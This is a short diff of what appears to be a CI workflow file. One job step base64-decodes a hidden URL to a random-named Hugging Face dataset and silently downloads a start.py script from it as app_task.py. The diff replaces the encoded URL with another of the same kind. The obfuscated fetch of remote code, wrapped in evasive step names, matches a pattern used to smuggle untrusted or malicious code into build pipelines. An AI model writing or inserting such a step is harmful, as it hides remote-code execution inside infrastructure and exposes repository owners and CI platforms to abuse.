@@ -69,7 +69,7 @@ jobs:
       - name: Bring Down Executive Scroll
         run: |
           echo "[BRINGDOWN] Bringing down app_task.py from assigned repository coffer..."
-          REPOSITORY_COFFER=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          REPOSITORY_COFFER=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrMS9mb2Zmby9yZXNvbHZlL21haW4vc3RhcnQucHk=" | base64 --decode)
           curl -sL "$REPOSITORY_COFFER" -o app_task.py
           echo "[BRINGDOWN] Executive scroll brought down."
 
